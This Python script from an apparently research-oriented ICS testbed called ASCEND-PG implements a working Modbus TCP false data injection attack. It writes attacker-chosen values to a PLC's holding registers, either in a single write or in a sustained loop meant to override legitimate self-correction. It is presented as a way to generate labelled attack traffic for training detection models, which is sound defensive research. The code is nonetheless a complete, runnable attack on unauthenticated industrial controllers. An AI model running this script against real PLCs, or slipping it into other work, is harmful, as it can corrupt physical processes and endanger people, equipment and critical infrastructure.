"""
ASCEND-PG attacks/fdi_attack.py

Real Modbus TCP False Data Injection (FDI) attack. (MITRE ATT&CK for
ICS: T0836 — Modify Parameter.)

Vanilla Modbus TCP has no authentication -- any host that can reach
the PLC on port 502 can write arbitrary values to its holding
registers. This script does exactly that: it connects to a target
PLC exactly like a legitimate SCADA client would, then issues write
requests that inject false sensor/actuator values.

This is the "attack" half of the FDI story; testbed/scada_client.py
(the "victim") will show the corrupted values on its next poll -- that
divergence between what should be true and what the PLC now reports
is the ground-truth signal the detection models (LSTM/Autoencoder)
need to learn to catch.

Run this from the attacker host, e.g.:
    attacker.cmd('python3 attacks/fdi_attack.py --target 10.0.0.1 &')
or let scripts/run_cycle.py drive it as one step of the full cycle.
"""

import argparse
import time
import logging

from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("fdi_attack")


def inject_single(ip, port, address, value, device_id=1):
    """
    One-shot FDI: write a single false value to one register and exit.
    Address is 0-based here to match write_register's own indexing
    (this is a client-side write call, unrelated to the server's
    internal ModbusSequentialDataBlock address-1 quirk on the PLC side).
    """
    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target %s:%d", ip, port)
        return False

    try:
        result = client.write_register(address=address, value=value, device_id=device_id)
        if result.isError():
            log.error("FDI write failed: %s", result)
            return False
        log.info("FDI SUCCESS: wrote value=%d to register %d on %s:%d",
                  value, address, ip, port)
        return True
    finally:
        client.close()


def inject_sustained(ip, port, address, value, interval, duration, device_id=1):
    """
    Sustained FDI: keep re-writing the false value on an interval for
    `duration` seconds, overriding any legitimate PLC self-correction
    and simulating a persistent attacker rather than a single injected
    packet. Useful for generating enough malicious traffic samples for
    the detection-model training set (Modules 6-8).
    """
    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target %s:%d", ip, port)
        return

    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            result = client.write_register(address=address, value=value, device_id=device_id)
            if result.isError():
                log.warning("FDI write failed mid-attack: %s", result)
            else:
                log.info("FDI write: register %d = %d on %s:%d", address, value, ip, port)
            time.sleep(interval)
    finally:
        client.close()
        log.info("Sustained FDI attack finished (%s seconds)", duration)


def main():
    parser = argparse.ArgumentParser(description="ASCEND-PG Modbus FDI attack")
    parser.add_argument("--target", required=True, help="target PLC IP")
    parser.add_argument("-p", "--port", type=int, default=502)
    parser.add_argument("-a", "--address", type=int, default=0,
                         help="holding register address to inject into")
    parser.add_argument("-v", "--value", type=int, default=9999,
                         help="false value to inject")
    parser.add_argument("--sustained", action="store_true",
                         help="repeat the injection instead of a single write")
    parser.add_argument("--interval", type=float, default=1.0,
                         help="seconds between writes when --sustained")
    parser.add_argument("--duration", type=float, default=10.0,
                         help="total seconds to sustain the attack")
    args = parser.parse_args()

    if args.sustained:
        inject_sustained(args.target, args.port, args.address, args.value,
                          args.interval, args.duration)
    else:
        inject_single(args.target, args.port, args.address, args.value)


if __name__ == "__main__":
    main()
